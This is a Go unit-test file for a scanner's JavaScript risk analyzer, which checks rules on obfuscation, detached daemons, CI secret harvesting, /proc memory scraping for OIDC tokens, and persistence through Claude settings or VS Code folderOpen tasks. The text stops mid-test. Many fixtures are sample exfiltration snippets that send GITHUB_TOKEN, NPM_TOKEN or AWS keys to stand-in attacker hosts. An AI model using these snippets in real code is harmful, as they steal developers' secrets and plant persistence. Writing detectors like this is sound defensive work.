package jsrisk

import (
	"context"
	"strings"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
	"github.com/garagon/aguara/internal/types"
)

func analyze(t *testing.T, relPath, content string) []types.Finding {
	t.Helper()
	a := New()
	target := &scanner.Target{
		Path:    relPath,
		RelPath: relPath,
		Content: []byte(content),
	}
	findings, err := a.Analyze(context.Background(), target)
	if err != nil {
		t.Fatalf("Analyze returned error: %v", err)
	}
	return findings
}

func hasRule(findings []types.Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func findRule(findings []types.Finding, ruleID string) *types.Finding {
	for i := range findings {
		if findings[i].RuleID == ruleID {
			return &findings[i]
		}
	}
	return nil
}

// --- target gating ---

func TestIsJavaScriptTarget(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{"script.js", true},
		{"module.mjs", true},
		{"common.cjs", true},
		{"sub/script.JS", true},
		{"/repo/index.js", true},
		{"script.ts", false},
		{"script.json", false},
		{"package.json", false},
		{"README.md", false},
	}
	for _, c := range cases {
		got := isJavaScriptTarget(&scanner.Target{Path: c.path, RelPath: c.path})
		if got != c.want {
			t.Errorf("isJavaScriptTarget(%q) = %v, want %v", c.path, got, c.want)
		}
	}
}

func TestAnalyzer_NonJSFile(t *testing.T) {
	findings := analyze(t, "package.json", `{}`)
	if len(findings) != 0 {
		t.Fatalf("expected no findings for non-JS target, got %d", len(findings))
	}
}

// --- JS_OBF_001 ---

func TestSafe_PlainScript(t *testing.T) {
	findings := analyze(t, "hello.js", `console.log("hello, world");`)
	if hasRule(findings, RuleObfuscation) {
		t.Errorf("plain script must not trigger JS_OBF_001, got: %+v", findings)
	}
}

func TestSafe_MinifiedVendorBundleNoObfSignal(t *testing.T) {
	// Large file, long single line, but no hex identifiers / dispatcher
	// calls / while(!![]). Must not trigger.
	body := strings.Repeat("var foo=function(a,b){return a+b;};", 20000) // ~700KB, single line if no newlines
	findings := analyze(t, "vendor.js", body)
	if hasRule(findings, RuleObfuscation) {
		t.Errorf("minified vendor bundle without obfuscator signals must not trigger JS_OBF_001, got: %+v", findings)
	}
}

func TestVuln_Obfuscation_HexIdentifiersAndWhileTrue(t *testing.T) {
	// 200 _0xNNNN references plus while(!![]) is two obfuscator-specific
	// signals — well above the threshold for JS_OBF_001.
	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){console.log('a');}\n"
	findings := analyze(t, "payload.js", body)
	f := findRule(findings, RuleObfuscation)
	if f == nil {
		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityMedium {
		t.Errorf("obfuscation-only chain should be MEDIUM, got %v", f.Severity)
	}
}

func TestVuln_Obfuscation_EscalatesWithProcessEnv(t *testing.T) {
	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){var x=process.env.GITHUB_TOKEN;}\n"
	findings := analyze(t, "payload.js", body)
	f := findRule(findings, RuleObfuscation)
	if f == nil {
		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("obfuscation + process.env should be HIGH, got %v", f.Severity)
	}
}

// --- JS_DAEMON_001 ---

func TestSafe_NormalSpawn(t *testing.T) {
	body := `const { spawn } = require('child_process'); spawn('ls', ['-l']);`
	findings := analyze(t, "ok.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("normal spawn must not trigger JS_DAEMON_001, got: %+v", findings)
	}
}

func TestVuln_Daemon_DetachedIgnoreStdio(t *testing.T) {
	body := `
const cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`
	findings := analyze(t, "daemon.js", body)
	f := findRule(findings, RuleDaemon)
	if f == nil {
		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("daemon shape alone should be HIGH, got %v", f.Severity)
	}
}

func TestVuln_Daemon_EscalatesWithSecretAccess(t *testing.T) {
	body := `
const cp = require('child_process');
const tok = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:tok});
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`
	findings := analyze(t, "daemon2.js", body)
	f := findRule(findings, RuleDaemon)
	if f == nil {
		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("daemon + secret/network should be CRITICAL, got %v", f.Severity)
	}
}

func TestSafe_DetachedFalseDoesNotTrigger(t *testing.T) {
	body := `const child = require('child_process').spawn('ls', [], { detached: false, stdio: 'ignore' });`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("detached:false must not trigger daemon, got: %+v", findings)
	}
}

// --- JS_CI_SECRET_HARVEST_001 ---

func TestSafe_SecretReadWithoutSink(t *testing.T) {
	body := `if (process.env.GITHUB_TOKEN) { console.log('have token'); }`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("secret read without sink must not trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_TokenAndFetch(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker.example/exfil', {method:'POST', body: t});
`
	findings := analyze(t, "h.js", body)
	f := findRule(findings, RuleCISecretHarvest)
	if f == nil {
		t.Fatalf("expected JS_CI_SECRET_HARVEST_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("harvest should be CRITICAL, got %v", f.Severity)
	}
	if !strings.Contains(f.MatchedText, "GITHUB_TOKEN") {
		t.Errorf("MatchedText should mention the secret name, got %q", f.MatchedText)
	}
}

func TestVuln_CISecretHarvest_NpmRegistrySink(t *testing.T) {
	body := `
const t = process.env.NPM_TOKEN;
require('https').request('https://registry.npmjs.org/-/npm/v1/tokens', {method:'PUT'});
`
	findings := analyze(t, "p.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("npm registry sink with NPM_TOKEN should trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_GitHubGraphQLSink(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://api.github.com/graphql', {method:'POST', headers:{Authorization:'Bearer '+t}, body:'{createCommitOnBranch}'});
`
	findings := analyze(t, "g.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("GitHub graphql + token should trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_SessionExfilSink(t *testing.T) {
	body := `
const t = process.env.AWS_SECRET_ACCESS_KEY;
fetch('https://filev2.getsession.org/', {method:'POST', body:t});
`
	findings := analyze(t, "s.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("session exfil endpoint should trigger harvest, got: %+v", findings)
	}
}

// --- JS_PROC_MEM_OIDC_001 ---

func TestSafe_ProcOnlyNoOIDC(t *testing.T) {
	body := `const cpu = require('fs').readFileSync('/proc/stat');`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/stat read without OIDC must not trigger ProcMemOIDC, got: %+v", findings)
	}
}

func TestVuln_ProcMemOIDC_TokenEnv(t *testing.T) {
	body := `
const fs = require('fs');
const dir = fs.readdirSync('/proc');
for (const pid of dir) {
  const mem = fs.readFileSync('/proc/' + pid + '/mem');
  if (mem.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {
    fetch('https://attacker/x', {method:'POST', body: mem});
  }
}
`
	findings := analyze(t, "scan.js", body)
	f := findRule(findings, RuleProcMemOIDC)
	if f == nil {
		t.Fatalf("expected JS_PROC_MEM_OIDC_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("proc mem + OIDC must be CRITICAL, got %v", f.Severity)
	}
}

func TestVuln_ProcMemOIDC_RunnerWorker(t *testing.T) {
	body := `
const maps = require('fs').readFileSync('/proc/self/maps');
if (maps.includes('Runner.Worker')) { /* pivot */ }
`
	findings := analyze(t, "r.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc + Runner.Worker should trigger, got: %+v", findings)
	}
}

// --- AGENT_PERSISTENCE_001 ---

func TestSafe_DocumentationMention(t *testing.T) {
	// A literal /* .claude/settings.json */ inside a code comment in an
	// unrelated tool should still flag because the analyzer cannot know
	// it is a comment. We do not promise to skip comments. Just verify
	// the rule fires consistently on the path mention.
	body := `console.log("hello");`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf("script with no agent-path mention must not trigger, got: %+v", findings)
	}
}

func TestVuln_AgentPersistence_ClaudeSettings(t *testing.T) {
	body := `
const fs = require('fs');
fs.writeFileSync(process.env.HOME + '/.claude/settings.json', '{"hooks":{}}');
`
	findings := analyze(t, "ap.js", body)
	f := findRule(findings, RuleAgentPersistence)
	if f == nil {
		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("agent persistence alone should be HIGH, got %v", f.Severity)
	}
}

func TestVuln_AgentPersistence_VSCodeRunOnFolderOpen(t *testing.T) {
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{label: 'init', command: 'node setup.mjs', runOn: 'folderOpen'}]
}));
`
	findings := analyze(t, "v.js", body)
	if !hasRule(findings, RuleAgentPersistence) {
		t.Errorf("expected AGENT_PERSISTENCE_001 for VS Code folderOpen, got: %+v", findings)
	}
}

func TestVuln_AgentPersistence_EscalatesWithSecretHarvest(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:t});
require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
`
	findings := analyze(t, "ap2.js", body)
	f := findRule(findings, RuleAgentPersistence)
	if f == nil {
		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("persistence + secret harvest must be CRITICAL, got %v", f.Severity)
	}
}

// --- pass-13 fixes: fetch local-method boundary + inline https.get ---

func TestSafe_LocalFetchMethod(t *testing.T) {
	// `.fetch(...)` on an unrelated object paired with a CI token
	// read must not satisfy the network sink.
	body := `
const cache = makeCache();
const t = process.env.GITHUB_TOKEN;
cache.fetch({ token: t });
`
	findings := analyze(t, "lf.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("local .fetch() must not chain harvest, got: %+v", findings)
	}
}

func TestVuln_GlobalFetchStillFires(t *testing.T) {
	// Global fetch (or `await fetch`) must still chain.
	body := `
const t = process.env.GITHUB_TOKEN;
await fetch('https://attacker/x', {method:'POST', body:t});
`
	findings := analyze(t, "gf.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("global fetch must still chain harvest, got: %+v", findings)
	}
}

func TestVuln_InlineHttpsGet(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
require('https').get('https://attacker/x?t=' + encodeURIComponent(t));
`
	findings := analyze(t, "ig.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("require('https').get(...) inline must chain harvest, got: %+v", findings)
	}
}

// --- pass-12 fixes: $-prefixed aliases + computed env reads ---

func TestVuln_DollarPrefixedCPAlias(t *testing.T) {
	body := `
const $cp = require('child_process');
$cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "dp.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("$cp alias (JS identifier with leading $) must chain daemon, got: %+v", findings)
	}
}

func TestVuln_DollarPrefixedHTTPSAlias(t *testing.T) {
	body := `
const $h = require('https');
const t = process.env.GITHUB_TOKEN;
$h.request({hostname:'attacker.example'}).end(t);
`
	findings := analyze(t, "dh.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("$h alias must chain harvest, got: %+v", findings)
	}
}

func TestVuln_EnvReadOptionalChain(t *testing.T) {
	body := `
const t = process.env?.GITHUB_TOKEN;
fetch('https://attacker/x', {body:t});
`
	findings := analyze(t, "oc.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("process.env?.NAME optional chaining must chain harvest, got: %+v", findings)
	}
}

func TestVuln_EnvReadTemplateBracket(t *testing.T) {
	body := "const t = process.env[`GITHUB_TOKEN`];\nfetch('https://attacker/x', {body:t});\n"
	findings := analyze(t, "tb.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("process.env[`NAME`] template-bracket form must chain harvest, got: %+v", findings)
	}
}

// --- pass-11 fixes: HTTP module aliases, .vscode/setup.mjs gating ---

func TestVuln_HttpsAliasRequestSink(t *testing.T) {
	body := `
const h = require('https');
const t = process.env.GITHUB_TOKEN;
h.request({hostname:'attacker.example', method:'POST'}).end(t);
`
	findings := analyze(t, "ha.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("aliased https.request must chain harvest, got: %+v", findings)
	}
}

func TestVuln_ESMNetAliasSink(t *testing.T) {
	body := `
import net from 'node:net';
const t = process.env.AWS_SECRET_ACCESS_KEY;
net.connect({port:1234, host:'attacker'}).write(t);
`
	findings := analyze(t, "na.mjs", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("ESM net alias must chain harvest, got: %+v", findings)
	}
}

func TestSafe_LocalNetVariable(t *testing.T) {
	// A local `net` variable not bound from the node net module must
	// not satisfy the alias network sink.
	body := `
const net = makeServer();
const t = process.env.GITHUB_TOKEN;
net.request({});
`
	findings := analyze(t, "ln.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("local net variable must not chain harvest, got: %+v", findings)
	}
}

func TestSafe_VSCodeSetupMjsAloneNoTrigger(t *testing.T) {
	// A reference to .vscode/setup.mjs on its own does not auto-run.
	// Without a tasks.json + runOn:folderOpen pair, this is not
	// persistence.
	body := `
require('fs').writeFileSync('.vscode/setup.mjs', '// hello');
`
	findings := analyze(t, "vs.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf(".vscode/setup.mjs alone must not chain persistence, got: %+v", findings)
	}
}

// --- pass-10 fixes: imports-aware aliases, quoted runOn ---

func TestSafe_LocalCPNotImported(t *testing.T) {
	// A local variable named `cp` that is NOT bound from
	// child_process must not satisfy the receiver match.
	body := `
const cp = makeControlPlane();
cp.spawn('worker', { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "lcp.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("locally-defined cp must not chain daemon, got: %+v", findings)
	}
}

func TestVuln_ESMNamespaceImportReceiver(t *testing.T) {
	body := `
import * as cp from 'node:child_process';
cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ns.mjs", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("ESM namespace import receiver must chain, got: %+v", findings)
	}
}

func TestVuln_ESMDefaultImportReceiver(t *testing.T) {
	body := `
import cp from 'child_process';
cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "df.mjs", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("ESM default import receiver must chain, got: %+v", findings)
	}
}

func TestVuln_PersistenceQuotedRunOn(t *testing.T) {
	// Single-quoted runOn key inside a .vscode/tasks.json write must
	// still satisfy the persistence rule.
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{label:'init', command:'node setup.mjs', 'runOn': 'folderOpen'}]
}));
`
	findings := analyze(t, "qr.js", body)
	if !hasRule(findings, RuleAgentPersistence) {
		t.Errorf("quoted 'runOn': 'folderOpen' inside tasks.json write must chain, got: %+v", findings)
	}
}

// --- pass-9 fixes: aliased destructure binding, ESM imports ---

func TestVuln_AliasedDestructureCJS(t *testing.T) {
	body := `
const { spawn: launch } = require('child_process');
launch('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ac.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("aliased CJS destructure (spawn:launch) must chain daemon, got: %+v", findings)
	}
}

func TestVuln_ESMDestructureImport(t *testing.T) {
	body := `
import { spawn } from 'node:child_process';
spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "esm.mjs", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("ESM import { spawn } from child_process must chain, got: %+v", findings)
	}
}

func TestVuln_ESMAliasedImport(t *testing.T) {
	body := `
import { spawn as launch } from 'child_process';
launch('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "esma.mjs", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("ESM aliased import (spawn as launch) must chain, got: %+v", findings)
	}
}

func TestSafe_BareCallNamedSpawnNotImported(t *testing.T) {
	// A function literally named `spawn` that has no child_process
	// origin must not chain even if it carries daemon-shape options.
	body := `
function spawn(opts) { return opts; }
spawn('node', ['x'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ns.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("locally-defined spawn must not chain daemon, got: %+v", findings)
	}
}

// --- pass-8 fixes: receiver-bound daemon match, drop .unref()-only chain ---

func TestSafe_WorkerSpawnWithCPImported(t *testing.T) {
	// File imports child_process AND has an unrelated worker.spawn(...)
	// with daemon options. The unrelated receiver must not trip the
	// rule even though the module is present.
	body := `
const cp = require('child_process');
cp.exec('echo hello');
const worker = makeWorker();
worker.spawn('node', ['x'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ws.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("worker.spawn(...) with daemon opts must not chain even when cp is imported, got: %+v", findings)
	}
}

func TestVuln_CPMethodAliasMatches(t *testing.T) {
	// `cp` is a conventional alias; method-form invocation with daemon
	// options must chain.
	body := `
const cp = require('child_process');
cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "cp.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("cp.spawn(...) alias chain must trigger daemon, got: %+v", findings)
	}
}

func TestVuln_RequireChainInline(t *testing.T) {
	// require('child_process').spawn(...) inline form must chain.
	body := `
require('child_process').spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "rc.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("require chain inline must chain daemon, got: %+v", findings)
	}
}

func TestSafe_UnrefAloneWithoutStdioIgnore(t *testing.T) {
	// detached:true + .unref() on the spawn return but without
	// stdio:'ignore' no longer chains. The rule now requires
	// stdio:'ignore' explicitly so unrelated `.unref()` calls
	// (setTimeout(...).unref()) cannot satisfy the chain.
	body := `
const cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], { detached: true });
child.unref();
`
	findings := analyze(t, "u.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("unref-only chain (no stdio:ignore) should not fire, got: %+v", findings)
	}
}

func TestSafe_UnrelatedUnrefInWindow(t *testing.T) {
	// A spawn with detached:true followed by setTimeout().unref()
	// nearby must not satisfy the chain (the .unref() is not on the
	// child). With stdio:'ignore' absent, the rule cannot fire.
	body := `
const cp = require('child_process');
cp.spawn('node', ['x'], { detached: true });
setTimeout(() => {}, 1000).unref();
`
	findings := analyze(t, "tu.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("unrelated .unref() with no stdio:ignore must not chain, got: %+v", findings)
	}
}

// --- pass-7 fixes: daemon proximity, aliased destructure, whitespace in network ---

func TestSafe_DaemonOptionsFarFromSpawn(t *testing.T) {
	// Daemon-shape options 600 bytes away from a child_process call
	// fall outside the proximity window and must not chain.
	padding := strings.Repeat("// padding line padding line padding line padding line\n", 12)
	body := `
const cp = require('child_process');
cp.spawn('echo', ['hello']);
` + padding + `
const helperConfig = { detached: true, stdio: 'ignore' };
`
	findings := analyze(t, "fp.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("daemon options outside proximity window must not chain, got: %+v", findings)
	}
}

func TestVuln_AliasedDestructureSecretRead(t *testing.T) {
	body := `
const { GITHUB_TOKEN: t } = process.env;
fetch('https://attacker/x', {method:'POST', body:t});
`
	findings := analyze(t, "al.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("aliased destructured env read must chain harvest, got: %+v", findings)
	}
}

func TestVuln_MixedAliasedAndPlainDestructure(t *testing.T) {
	body := `
const { FOO, GITHUB_TOKEN: t, BAR: b } = process.env;
fetch('https://attacker/x', {body: t});
`
	findings := analyze(t, "mx.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("mixed aliased/plain destructure must still pick CI secret, got: %+v", findings)
	}
}

func TestVuln_NetworkSinkWhitespaceBeforeParen(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch ('https://attacker/x', {method:'POST', body: t});
`
	findings := analyze(t, "ws.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("fetch with whitespace before ( must chain harvest, got: %+v", findings)
	}
}

// --- pass-6 fixes: child-process module gate, destructured env reads, runOn context ---

func TestSafe_UnrelatedWorkerSpawnMethod(t *testing.T) {
	// Calling .spawn(...) on an unrelated object should not chain
	// daemon even when the file has detached:true / stdio:'ignore'.
	body := `
const worker = makeWorker();
worker.spawn('node', ['x'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "w.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("non-child_process spawn must not chain daemon, got: %+v", findings)
	}
}

func TestVuln_DestructuredSpawnImport(t *testing.T) {
	// Destructured import is the more idiomatic Node form; daemon
	// chain must recognize it.
	body := `
const { spawn } = require('child_process');
spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ds.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("destructured spawn import + invocation must chain, got: %+v", findings)
	}
}

func TestVuln_DestructuredEnvSecretRead(t *testing.T) {
	body := `
const { GITHUB_TOKEN } = process.env;
fetch('https://attacker/x', {method:'POST', body:GITHUB_TOKEN});
`
	findings := analyze(t, "de.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("destructured env read + sink must chain harvest, got: %+v", findings)
	}
}

func TestVuln_DestructuredEnvMultipleNames(t *testing.T) {
	body := `
const { FOO, GITHUB_TOKEN, BAR } = process.env;
require('https').request('https://attacker/x').end(GITHUB_TOKEN);
`
	findings := analyze(t, "dem.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("destructured env with mixed names must still pick CI secret, got: %+v", findings)
	}
}

func TestSafe_RunOnFolderOpenWithoutTasksContext(t *testing.T) {
	// A standalone `runOn: 'folderOpen'` token outside any
	// tasks.json reference (e.g. an extension helper or a schema
	// definition) must not by itself chain persistence.
	body := `
const choices = {
  runOn: ["folderOpen", "manual"],
};
console.log(choices);
`
	findings := analyze(t, "ro.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf("runOn without tasks.json context must not chain, got: %+v", findings)
	}
}

// --- pass-5 fixes: real env reads, real child_process calls, tasks.json gating ---

func TestSafe_SecretNameMentionedNotRead(t *testing.T) {
	// A string that names GITHUB_TOKEN (documentation, error message,
	// UI label) plus an HTTP call must not by itself satisfy the
	// harvest chain.
	body := `
console.error("GITHUB_TOKEN is required");
fetch('https://api.example.com/health');
`
	findings := analyze(t, "doc.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("documentation mention of GITHUB_TOKEN must not satisfy harvest, got: %+v", findings)
	}
}

func TestVuln_SecretReadBracketForm(t *testing.T) {
	// process.env['NAME'] form must still count as a real read.
	body := `
const t = process.env['GITHUB_TOKEN'];
fetch('https://attacker/x', {method:'POST', body:t});
`
	findings := analyze(t, "br.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("process.env['GITHUB_TOKEN'] must satisfy harvest, got: %+v", findings)
	}
}

func TestSafe_ChildProcessImportNoInvocation(t *testing.T) {
	// Importing child_process without calling spawn/fork/exec must not
	// satisfy the daemon chain even when an unrelated object literal
	// in the file carries detached:true / stdio:'ignore'.
	body := `
const cp = require('child_process');
const defaultOpts = { detached: true, stdio: 'ignore' };
console.log('cp loaded; opts', defaultOpts);
`
	findings := analyze(t, "imp.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("child_process import alone must not chain daemon, got: %+v", findings)
	}
}

func TestVuln_ChildProcessSpawnRequired(t *testing.T) {
	body := `
const cp = require('child_process');
cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "sp.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("actual spawn invocation should still chain, got: %+v", findings)
	}
}

func TestVuln_ChildProcessExecAccepted(t *testing.T) {
	// .exec(...) is also an invocation.
	body := `
require('child_process').exec('long-running &', { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ex.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf(".exec() must satisfy child-process invocation, got: %+v", findings)
	}
}

func TestSafe_VSCodeTasksWithoutRunOn(t *testing.T) {
	// Writing a manually-runnable .vscode/tasks.json (no folderOpen)
	// must not by itself trigger AGENT_PERSISTENCE_001.
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{ label: 'manual', command: 'echo' }]
}));
`
	findings := analyze(t, "v.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf("manual .vscode/tasks.json must not chain persistence, got: %+v", findings)
	}
}

func TestVuln_VSCodeTasksWithFolderOpen(t *testing.T) {
	// Adding the folderOpen trigger turns a tasks.json write into
	// real persistence.
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{ label: 'init', command: 'node setup.mjs',
            runOptions: { runOn: 'folderOpen' } }]
}));
`
	findings := analyze(t, "vf.js", body)
	if !hasRule(findings, RuleAgentPersistence) {
		t.Errorf("tasks.json + runOn:folderOpen must chain persistence, got: %+v", findings)
	}
}

// --- pass-4 fixes: distinguish /proc/<pid>/<sub> from root /proc files ---

func TestSafe_ProcMeminfoNotMemoryAccess(t *testing.T) {
	// /proc/meminfo is a root-level file showing system memory totals.
	// Even with an OIDC env reference in the same file, it must not
	// trigger the runner-pivot rule.
	body := `
const totals = require('fs').readFileSync('/proc/meminfo', 'utf8');
console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'have' : 'no');
`
	findings := analyze(t, "mi.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/meminfo must not chain ProcMemOIDC, got: %+v", findings)
	}
}

func TestSafe_ProcCmdlineRootNotMemoryAccess(t *testing.T) {
	// /proc/cmdline (no pid segment) shows kernel boot args; it is not
	// a per-process pivot file.
	body := `
const bootArgs = require('fs').readFileSync('/proc/cmdline', 'utf8');
const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
`
	findings := analyze(t, "rc.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("root-level /proc/cmdline must not chain, got: %+v", findings)
	}
}

func TestVuln_ProcMemTemplateLiteral(t *testing.T) {
	// Template literal `/proc/${pid}/mem` is a real attacker form.
	body := "const fs = require('fs');\nconst m = fs.readFileSync(`/proc/${pid}/mem`);\nif (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}\n"
	findings := analyze(t, "tmpl.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("template literal /proc/${pid}/mem must chain, got: %+v", findings)
	}
}

func TestVuln_ProcMemLiteralPidNumeric(t *testing.T) {
	body := `
const m = require('fs').readFileSync('/proc/12345/maps');
if (m.includes('Runner.Worker')) {}
`
	findings := analyze(t, "lit.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("literal /proc/12345/maps must chain, got: %+v", findings)
	}
}

// --- pass-3 fixes: property boundary on daemon options + proximate /proc subpath ---

func TestSafe_NotDetachedOption(t *testing.T) {
	// A spawn option literally named `notdetached: true` (or
	// `isDetached: true`) must not satisfy the detached signal.
	body := `
const cp = require('child_process');
cp.spawn('node', ['x'], { notdetached: true, stdio: 'ignore' });
`
	findings := analyze(t, "n.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("notdetached:true must not chain daemon, got: %+v", findings)
	}
}

func TestSafe_IsDetachedHelperVar(t *testing.T) {
	body := `
const cp = require('child_process');
const isDetached = true;
cp.spawn('node', ['x'], { stdio: 'ignore' });
`
	findings := analyze(t, "i.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("isDetached helper var must not chain daemon, got: %+v", findings)
	}
}

func TestSafe_IsStdioPropertyDoesNotMatch(t *testing.T) {
	// `isStdio: 'ignore'` must not satisfy the stdio signal.
	body := `
const cp = require('child_process');
cp.spawn('node', ['x'], { detached: true, isStdio: 'ignore' });
`
	findings := analyze(t, "is.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("isStdio property must not chain stdio, got: %+v", findings)
	}
}

func TestSafe_UnrelatedProcAndCmdlineFarApart(t *testing.T) {
	// A /proc/stat read at the top of a file and an unrelated 'cmdline'
	// identifier near the bottom must not chain as memory access.
	body := `
const stat = require('fs').readFileSync('/proc/stat');
// ... many lines of code ...
` + strings.Repeat("// padding line\n", 30) + `
const myCmdline = 'this is just an identifier';
const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
`
	findings := analyze(t, "f.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
